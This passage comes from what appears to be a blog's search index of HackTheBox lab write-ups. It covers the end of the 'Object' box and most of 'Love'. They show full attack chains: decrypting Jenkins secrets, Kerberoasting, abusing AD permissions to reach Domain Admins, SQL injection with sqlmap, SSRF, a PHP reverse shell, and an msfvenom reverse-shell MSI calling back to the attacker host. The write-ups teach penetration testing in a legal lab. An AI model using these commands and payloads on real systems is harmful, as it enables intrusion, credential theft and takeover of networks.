Fingerprint cleanup.log.2| Fingerprint cleanup.log.3| Fingerprint cleanup.log.4| Fingerprint cleanup.log.5| Periodic background build discarder.log| +---nodes|+---secrets| | hudson.console.AnnotatedLargeText.consoleAnnotator| | hudson.model.Job.serverCookie| | hudson.util.Secret| | jenkins.model.Jenkins.crumbSalt| | master.key| | org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY| | slave-to-master-security-kill-switch| +---users| | users.xml| | | +---admin_17207690984073220035| | config.xml| | | \\---StrongShiv8_3208607382825130350| config.xml| +---workflow-libs\\---workspace +---1 \\---AccessC:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\Access>exit 0 Finished: SUCCESS```{: .nolineno}So from this above output I have each users config file so lets access the admin one and also Lets see the `secret.key` file that looks interesting.![Untitled](Object/Untitled%2014.png)```powershellC:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\Access>cmd /c type C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\secret.key ac5757641b505503f44d2752ffa01e621bf5b935763ebc8adaa2e90cf85b13acC:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\Access>cmd /c type C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\users\\admin_17207690984073220035\\config.xml 10 admin admin 320a60b9-1e5c-4399-8afe-44466c9cde9e oliver {AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=} false all false false default ea75b5bd80e4763e true #jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW admin@object.local authenticated 1634793332195 C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\Access>exit 0 Finished: SUCCESS```{: .nolineno}I got a username and password which is encoded â†’```powershelloliver : {AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}```{: .nolineno}Then I searched online related to Jenkins password decoder and I encontered with this valid repository that I think gona give me password â†’[GitHub - gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins/tree/master)```powershellUsage:\tjenkins_offline_decrypt.py or:\tjenkins_offline_decrypt.py [credentials.xml]or:\tjenkins_offline_decrypt.py -i (interactive mode)```{: .nolineno}From this tool I need `master.key` , `hudson.util.Secret` , and config.xml file that I have access it so lets collect them all â†’![Untitled](Object/Untitled%2015.png)From above output I can access `master.key` directly through copy paste but not with `hudson.util.Secret` file , If I have to access this file I need to download it in my attacker machine but the Antivirus doesnâ€™t me therefore I have one Idea that I am gona try that it I am gona encode this file in base64 then save it in another file then copy those base64 encodings and from attacker machine decode it and make it `hudson.util.Secret` file again.![Untitled](Object/Untitled%2016.png)Lets decode now â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools/pwn_jenkins/offline_decryption]â””â”€$ python3 jenkins_offline_decrypt.py ~/Downloads/HTB/Object/master.key ~/Downloads/HTB/Object/hudson.util.Secret ~/Downloads/HTB/Object/config.xml c1cdfun_d2434```{: .nolineno}![Untitled](Object/Untitled%2017.png)I have `winrm` access lets have a shell now.I have to run bloodhound so for that I need to collect some data from the machine itself so I uploaded `SharpHound.exe` file that will collect all the data and make a `zip` file of it.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Object]â””â”€$ evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\oliver\\Documents> whoamiobject\\oliver*Evil-WinRM* PS C:\\Users\\oliver\\Documents> hostnamejenkins*Evil-WinRM* PS C:\\Users\\oliver\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\oliver> tree /f /aFolder PATH listingVolume serial number is 212C-60B7C:.+---.groovy| \\---grapes+---3D Objects+---Contacts+---Desktop| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\oliver>*Evil-WinRM* PS C:\\Users\\oliver\\Documents> upload ../../../../../../../../opt/Tools/SharpHound.exe Info: Uploading /home/kali/Downloads/HTB/Object/../../../../../../../../opt/Tools/SharpHound.exe to C:\\Users\\oliver\\Documents\\SharpHound.exe Data: 1395368 bytes of 1395368 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\Users\\oliver\\Documents> ls Directory: C:\\Users\\oliver\\DocumentsMode LastWriteTime Length Name---- ------------- ------ -----a---- 1/18/2024 9:42 AM 1046528 SharpHound.exe*Evil-WinRM* PS C:\\Users\\oliver\\Documents> .\\SharpHound.exe2024-01-18T09:43:20.2934227-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound2024-01-18T09:43:20.4496615-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote2024-01-18T09:43:20.4809304-08:00|INFORMATION|Initializing SharpHound at 9:43 AM on 1/18/20242024-01-18T09:43:20.6215545-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for object.local : jenkins.object.local2024-01-18T09:43:20.6528027-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote2024-01-18T09:43:20.8559267-08:00|INFORMATION|Beginning LDAP search for object.local2024-01-18T09:43:20.9028019-08:00|INFORMATION|Producer has finished, closing LDAP channel2024-01-18T09:43:20.9028019-08:00|INFORMATION|LDAP channel closed, waiting for consumers2024-01-18T09:43:51.5434215-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM2024-01-18T09:44:05.8402938-08:00|INFORMATION|Consumers finished, closing output channel2024-01-18T09:44:05.8871673-08:00|INFORMATION|Output channel closed, waiting for output task to completeClosing writers2024-01-18T09:44:06.0902955-08:00|INFORMATION|Status: 92 objects finished (+92 2.044445)/s -- Using 41 MB RAM2024-01-18T09:44:06.0902955-08:00|INFORMATION|Enumeration finished in 00:00:45.24195932024-01-18T09:44:06.1996832-08:00|INFORMATION|Saving cache with stats: 52 ID to type mappings. 52 name to SID mappings. 0 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings.2024-01-18T09:44:06.1996832-08:00|INFORMATION|SharpHound Enumeration Completed at 9:44 AM on 1/18/2024! Happy Graphing!*Evil-WinRM* PS C:\\Users\\oliver\\Documents> *Evil-WinRM* PS C:\\Users\\oliver\\Documents> ls Directory: C:\\Users\\oliver\\DocumentsMode LastWriteTime Length Name---- ------------- ------ -----a---- 1/18/2024 9:44 AM 11513 20240118094405_BloodHound.zip-a---- 1/18/2024 9:44 AM 7897 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin-a---- 1/18/2024 9:42 AM 1046528 SharpHound.exe-a---- 1/18/2024 9:31 AM 1308348 SharpHound.ps1*Evil-WinRM* PS C:\\Users\\oliver\\Documents> download 20240118094405_BloodHound.zip```{: .nolineno}Then I uploaded the json files into it and I got this domain / users structure â†’![Untitled](Object/Untitled%2018.png)This connected users indicates the lateral movement to the Domain Admins Group so Lets Follow BloodHound â†’![Untitled](Object/Untitled%2019.png)**ForceChangePassword** Object Permission Abuse :```powershell. .\\powerview.ps1$SecPassword = ConvertTo-SecureString 'c1cdfun_d2434' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('object.htb\\oliver', $SecPassword)$UserPassword = ConvertTo-SecureString 'Strong$hiv8' -AsPlainText -ForceSet-DomainUserPassword -Identity smith -AccountPassword $UserPassword -Credential $Cred```{: .nolineno}Lets check with winrm login with credentials `smith : Strong$hiv8` â†’**GenericWrite** Object Permission Abuse through following bloodhound steps â†’![Untitled](Object/Untitled%2020.png)In `GenericWrite` Abuse this user smith has to set the SPN name and then generate the Kerberos ticket of user maria and to decrypt the that ticket hash from offline Tools. ```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Object]â””â”€$ evil-winrm -i 10.10.11.132 -u smith -p 'Strong$hiv8' Evil-WinRM shell v3.5*Evil-WinRM* PS C:\\Users\\smith\\Documents> whoamiobject\\smith*Evil-WinRM* PS C:\\Users\\smith\\Documents> upload ../../../../../../../../../usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1*Evil-WinRM* PS C:\\Users\\smith\\Documents> . .\\powerview.ps1*Evil-WinRM* PS C:\\Users\\smith\\Documents> $SecPassword = ConvertTo-SecureString 'Strong$hiv8' -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\smith\\Documents> $Cred = New-Object System.Management.Automation.PSCredential('object.htb\\smith', $SecPassword)*Evil-WinRM* PS C:\\Users\\smith\\Documents>*Evil-WinRM* PS C:\\Users\\smith\\Documents> Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/What_ever_you_like'}*Evil-WinRM* PS C:\\Users\\smith\\Documents> Get-DomainSPNTicket maria | flCannot validate argument on parameter 'SPN'. The argument \"maria\" does not match the \".*/.*\" pattern. Supply an argument that matches \".*/.*\" and try the command again.At line:1 char:21+ Get-DomainSPNTicket maria | fl+ ~~~~~ + CategoryInfo : InvalidData: (:) [Get-DomainSPNTicket], ParameterBindingValidationException + FullyQualifiedErrorId : ParameterArgumentValidationError,Get-DomainSPNTicket```{: .nolineno}I tried the **GetDomainSPNTicket** to get execute but it did not worked so I tried with Rubeus.exe Tool and I got the Ticket like this :```powershell *Evil-WinRM* PS C:\\Users\\smith\\Documents> .\\Rubeus.exe kerberoast /creduser:object.local\\smith /credpassword:'Strong$hiv8' /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.1[*] Action: Kerberoasting[*] NOTICE: AES hashes will be returned for AES-enabled accounts.[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.[*] Target Domain : object.local[*] Searching path 'LDAP://jenkins.object.local/DC=object,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'[*] Total kerberoastable users : 1[*] SamAccountName : maria[*] DistinguishedName : CN=maria garcia,CN=Users,DC=object,DC=local[*] ServicePrincipalName : nonexistent/What_ever_you_like[*] PwdLastSet : 10/21/2021 9:16:32 PM[*] Supported ETypes : RC4_HMAC_DEFAULT[*] Hash : $krb5tgs$23$*maria$object.local$nonexistent/What_ever_you_like@object.local*$3D3C7979BE145530EE81826D2C07183D$49645F103784C3521C382073DAB4C0FCBC86417275B617560A61EADCC02465A8078B1F04B62CC0D6EC567F6CBBE78B4296A81A753558F4AC925B573C83118AB9396EB9214785CDA55E4061C4CE3BAD18BEFC757C9A3A663B0924DF1845CDA896513EE8C3FB94657F76A4915395F16F526A34D24B8CFF131E42AA3BAA7655B04CCB40D94D705494B863BCF35C1CAD609EB714800D0EF3F1D2F9F73322384718147AA784D70D0DA629642CDC952815DC66FBD5C44A0D7A98C6D0298557153122FFB6E8901F940655FD5F32B83483475B0DCC8A90538A5EDB3B1DF3A282F646A3960B4BEC2FD627DA7DE8A0BF1FFFACF55865397CD24DC9C0F048666E504E7BAA0AD23E51C74B3216C36119843EA36CE2933F7F3768B5B4C663EAAF487F8CF69FD3DCC8F055DED6494CCE3F531B47A34FF3C6638A59E189928EEA52A9520D2633D78778AFBE84B34D7BC192D01B00CDFC09891D75293C3F087CDDC26511DE87BA7522AF10DD5A94B3D0B5C38D0C3D1E257466396DAE973CA5D72386E2A4658114FE716EDC96DFDD9812F660A0883C55AC5FEBC7E0242AC4EB37B6E801CF0AADA6F59029F27E3806AA9B1F597BFD04D6A0A431183A56587313F0B330F8E3C0E617F19FF3A1AF3B677AA77A8DBC80DBCBB1C3D04E301DC1ED99541824A24DF1CAC3A7C8C792C3D7FD922B23C999C1324568C3A1994BF2438E50D47E7B58A27E7F1D6F295E378260C3098756BAC474C5C3C27FBF1CED567755F11A79ED56E05763C154A61DDFC2C702B9F12A78B45559722C020AF04CB1516CB7D51085F4A676B5CFB976A14940023268BFA319166A79F1CE58A8D95ADB34F29963365A7A2C479E65DEA4AC0134FD6F6C224F51BC19C35CF2FBBB739979F11A09896561CEAEAF1C7A29A9B7481A9D1A1169904225D2A60BB590503B7DFE183B911EA5E2AEA009AA6EB570DB55914444AC3A42A7127A5083C48735B9A732FCDF6A18BB7DE55C579788F46AB584B31AAB62FEE92FEF315D1F7BE325453869954D2D313CB945B7CBB61439E173BEE63813BCF8FE65B35464CAF893A05144E197B57CD994F52AA77F164D8A99D4425D89AF5760E8A04E87A3161841B8596F64DA9E48B00122573FB18A5EB6F2FCE23919E6D3D139E20A1DC93278614B2C99BF8C06F88981FBAC0A8DDE082385BAE6BE0FD6C59601D53E01E33C039CFC7B70664B65BA4578FD4C4B36BF4DE16321D9DF3B41CDB5A2DB647EC010CCA7F5EC93C5E8845E0A92C863458DC98BE1C23D0D269A038FDDEDAC4AE4337C98AFC928FA4E701FD74960D6DFBBFAD3D75A0810E71E82CBCD952FD5C2303497DABF8AC1DBB8E8D3154A9137D29A170F140985FB9DC88B6ADC786FA45A7CB17E0E4AB02E01DB9B5C0C17A57599130EF6B011B7690FA923818A89CA45CFC25251F3175794D852670BC8AD1F5FA96A1B4CA875D28B9F2903A110E6A1499303A8054863*Evil-WinRM* PS C:\\Users\\smith\\Documents>```{: .nolineno}I tried to crack this password with john and used wordlist as rockyou.txt file but couldnâ€™t cracked it .```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Object]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=krb5tgs Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:00:12 DONE (2024-01-19 16:01) 0g/s 1133Kp/s 1133Kc/s 1133KC/s 0841079575..*7Â¡Vamos!Session completed.```{: .nolineno}Now my other options are to look from outside For abusing GenericWrite and I found this :[Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user) link that exploits about the logon script that will work as `WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `maria` user, which means that the next time, when the user `maria` logs on, their system will execute our malicious script:```powershell# Powerview command that will execute this script and the ps1 file can have any command that will be executed as maria , -Credential $Cred is optional over here.Set-DomainObject -Credential $Cred -Identity maria -SET @{scriptpath='C:\\\\ProgramData\\\\logonscript.ps1'}```{: .nolineno}The Contents of the logonscript.ps1 file is :```powershellcmd /c whoami > C:\\ProgramData\\mariaUserInfo.txtcmd /c tree /f /a C:\\Users\\maria >> C:\\ProgramData\\mariaUserInfo.txt```{: .nolineno}Now I have to wait until the user maria logs onto her system :```powershell# Before Executing the scriptfile I have these files in the directory :*Evil-WinRM* PS C:\\ProgramData> dir Directory: C:\\ProgramDataMode LastWriteTime Length Name---- ------------- ------ ----d---s- 10/21/2021 3:13 AM Microsoftd----- 10/21/2021 12:05 AM regid.1991-06.com.microsoftd----- 9/15/2018 12:19 AM SoftwareDistributiond----- 4/10/2020 5:48 AM sshd----- 4/10/2020 10:49 AM USOPrivated----- 4/10/2020 10:49 AM USOSharedd----- 8/25/2021 2:57 AM VMware-a---- 1/19/2024 2:46 AM 244 logonscript.ps1-a---- 1/19/2024 2:15 AM 800054 powerview.ps1*Evil-WinRM* PS C:\\ProgramData># After I executed that Set-DomainObject script and wait around 1-2 minute I got this file :*Evil-WinRM* PS C:\\Programdata> dir Directory: C:\\ProgramdataMode LastWriteTime Length Name---- ------------- ------ ----d---s- 10/21/2021 3:13 AM Microsoftd----- 10/21/2021 12:05 AM regid.1991-06.com.microsoftd----- 9/15/2018 12:19 AM SoftwareDistributiond----- 4/10/2020 5:48 AM sshd----- 4/10/2020 10:49 AM USOPrivated----- 4/10/2020 10:49 AM USOSharedd----- 8/25/2021 2:57 AM VMware-a---- 1/19/2024 2:54 AM 384 logonscript.ps1-a---- 1/19/2024 2:54 AM 1018 mariaUserInfo.txt-a---- 1/19/2024 2:15 AM 800054 powerview.ps1*Evil-WinRM* PS C:\\Programdata> type mariaUserInfo.txtobject\\mariaFolder PATH listingVolume serial number is 212C-60B7C:\\USERS\\MARIA\\Invalid path - \\USERS\\MARIA\\No subfolders existFolder PATH listingVolume serial number is 212C-60B7C:\\USERS\\MARIA+---3D Objects+---Contacts+---Desktop| Engines.xls|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Programdata>```{: .nolineno}Now I am confirmed that this logon script is working so lets fetch this `Engines.xml` file to `C:\\ProgramData\\` directory .```powershell*Evil-WinRM* PS C:\\Programdata> echo 'cmd /c copy C:\\Users\\maria\\Desktop\\Engines.xls C:\\ProgramData\\Engines.xls' > C:\\ProgramData\\logonscript.ps1*Evil-WinRM* PS C:\\Programdata> dir Directory: C:\\ProgramdataMode LastWriteTime Length Name---- ------------- ------ ----d---s- 10/21/2021 3:13 AM Microsoftd----- 10/21/2021 12:05 AM regid.1991-06.com.microsoftd----- 9/15/2018 12:19 AM SoftwareDistributiond----- 4/10/2020 5:48 AM sshd----- 4/10/2020 10:49 AM USOPrivated----- 4/10/2020 10:49 AM USOSharedd----- 8/25/2021 2:57 AM VMware-a---- 10/26/2021 8:13 AM 6144 Engines.xls-a---- 1/19/2024 2:57 AM 152 logonscript.ps1-a---- 1/19/2024 2:56 AM 1018 mariaUserInfo.txt-a---- 1/19/2024 2:15 AM 800054 powerview.ps1*Evil-WinRM* PS C:\\Programdata> download Engines.xls```{: .nolineno}I opened this file with WPSOffice and I got these passwords so lets see which one is correct :![Untitled](Object/Untitled%2021.png)I ran `crackmapexec` Tool for that â†’![Untitled](Object/Untitled%2022.png)Now lets lateral move to Domain Admins group now â†’![Untitled](Object/Untitled%2023.png)Lets follow bloodhound now â†’**WriteOwner** Object Permission Abuse Now :![Untitled](Object/Untitled%2024.png)I also had to use the Internet to correct the flags or complete the syntax of this bloodhound commands â†’- Here `-Identity S-1-5-21-4088429403-1159899800-2753317549-512 SID` of Domain Admin.```powershellSet-DomainObjectOwner -Identity S-1-5-21-4088429403-1159899800-2753317549-512 -OwnerIdentity mariaAdd-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipleIdentity \"maria\" -Rights allAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'Get-DomainGroupMember -Identity 'Domain Admins'```{: .nolineno}Now I can see the user maria is in the group of domain admins.```powershell*Evil-WinRM* PS C:\\Users\\maria\\Documents> Get-DomainGroupMember -Identity 'Domain Admins'GroupDomain : object.localGroupName : Domain AdminsGroupDistinguishedName : CN=Domain Admins,CN=Users,DC=object,DC=localMemberDomain : object.localMemberName : mariaMemberDistinguishedName : CN=maria garcia,CN=Users,DC=object,DC=localMemberObjectClass : userMemberSID : S-1-5-21-4088429403-1159899800-2753317549-1106GroupDomain : object.localGroupName : Domain AdminsGroupDistinguishedName : CN=Domain Admins,CN=Users,DC=object,DC=localMemberDomain : object.localMemberName : AdministratorMemberDistinguishedName : CN=Administrator,CN=Users,DC=object,DC=localMemberObjectClass : userMemberSID : S-1-5-21-4088429403-1159899800-2753317549-500*Evil-WinRM* PS C:\\Users\\maria\\Documents>```{: .nolineno}Lets access the Administrators directory .```powershell*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 212C-60B7C:.+---3D Objects+---Contacts+---Desktop| root.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> type Desktop\\root.txt0599f7f0eb34eb0d1af6f6a83ca0e9ce*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Domain Admin Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Love", "url": "/posts/Love/", "categories": "HackTheBox", "tags": "AlwaysInstallElevated, File Upload, PrivEsc, SQLi, SSRF, Windows, sqlmap", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Love]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.239 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.o...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Love]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.239 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 10:20 ISTNmap scan report for 10.10.10.239Host is up (0.14s latency).Not shown: 65516 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open tcpwrapped|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: Voting System using PHP135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_ssl-date: TLS randomness does not represent time|_http-title: 403 Forbidden|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?| fingerprint-strings: | DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, LANDesk-RC, LDAPBindReq, NCP, NotesRPC, RTSPRequest, SIPOptions, SMBProgNeg, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: |_ Host '10.10.16.10' is not allowed to connect to this MariaDB server5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp open unknown5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| tls-alpn: |_ http/1.1|_ssl-date: 2024-01-14T05:36:18+00:00; +21m40s from scanner time.|_http-server-header: Microsoft-HTTPAPI/2.0| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after: 2024-04-10T14:39:19|_http-title: Not Found7680/tcp open pando-pub?47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and I got this site â†’![Untitled](Love/Untitled.png)I tried default credentials like `admin:admin` but no luck so I opened burpsuite and captured the request and saved it in req.txt file for `sqli` testing through sqlmap tool and specified the input values with asterisk so that the testing input indicated that place to test the inputs into.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Love]â””â”€$ cat req.txt POST /login.php HTTP/1.1Host: 10.10.10.239User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 33Origin: http://10.10.10.239Connection: closeReferer: http://10.10.10.239/index.phpCookie: PHPSESSID=endgeifc108294q2lnkqv290ibUpgrade-Insecure-Requests: 1voter=*&password=*&login=```{: .nolineno}I used `sqlmap` Tool for SQLi Testing .![Untitled](Love/Untitled%201.png)![Untitled](Love/Untitled%202.png)I got these dumped dataâ€™s â†’```bashDatabase: votesystemTable: admin[1 entry]+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+| id | photo | lastname | password | username | firstname | created_on |+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+| 1 | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin | Neovic | 2018-04-02 |+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+```{: .nolineno}But canâ€™t able to de code this password hash so I moved on to next enumeration process.I also while loading the http URL gets https redirected so I checked the certificates as an Enumeration process and I got something â†’![Untitled](Love/Untitled%203.png)A new subdomain so lets add that to `/etc/hosts` file â†’![Untitled](Love/Untitled%204.png)I got this file upload page so lets upload a payload or exploit into it â†’![Untitled](Love/Untitled%205.png)I also tried uploading different format of files but didnâ€™t work , then I check the SSRF vulnerability through `file:///` header and I got a hit so I can load sites through this .![Untitled](Love/Untitled%206.png)I looked for more ports and I got port `5000` from externally I got Access Denied so lets test internally â†’![Untitled](Love/Untitled%207.png)I got this :![Untitled](Love/Untitled%208.png)As I accessed the site internally as a `localhost` I got a hit and some credentials as well â†’```bashadmin: @LoveIsInTheAir!!!!```{: .nolineno}Lets login now into `http://love.htb/admin` :![Untitled](Love/Untitled%209.png)Now in Voters I added new Entries that allows me to upload a file so I uploaded the php reverse shell file and loaded the URL â†’![Untitled](Love/Untitled%2010.png)I loaded this URL `http://love.htb/images/php_shell_windows.php` and captured the callback â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Love]â””â”€$ rlwrap nc -lvnp 445listening on [any] 445 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.239] 50243SOCKET: Shell has connected! PID: 6852Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\xampp\\htdocs\\omrs\\images>whoamilove\\phoebeC:\\xampp\\htdocs\\omrs\\images>hostnameLoveC:\\xampp\\htdocs\\omrs\\images>```{: .nolineno}In this case I have no Impersonation privileges so I ran winpeas and got this exploitable â†’![Untitled](Love/Untitled%2011.png)In this privilege of **AlwaysInstallElevated :**I**f** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.```powershellreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated```{: .nolineno}**MSI Installation**To execute the **installation** of the malicious `.msi` file in **background:**```powershellmsiexec /quiet /qn /i C:\\Users\\Steve.INFERNO\\Downloads\\alwe.msi```{: .nolineno}To exploit this vulnerability you can use: *`exploit/windows/local/always_install_elevated`* Metasploit help.I checked on this system and it has that privileges to do so â†’```powershellC:\\Users\\Phoebe>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1C:\\Users\\Phoebe>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1```{: .nolineno}Then I created the payload as `msi` format through msfvenom â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Love]â””â”€$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.10 LPORT=445 -f msi -o shell.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of msi file: 159744 bytesSaved as: shell.msi```{: .nolineno}Transferred it through `certutil.exe` Tool and Installed the MSI â†’```powershellmsiexec /quiet /qn /i C:\\Users\\Phoebe\\shell.msi```{: .nolineno}![Untitled](Love/Untitled%2012.png)```powershellC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 0319DDF8 56DE:BA30C:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---OneDrive+---Pictures| +---Camera Roll| \\---Saved Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-2955427858-187959437-2037071653-500}-.searchconnector-ms| 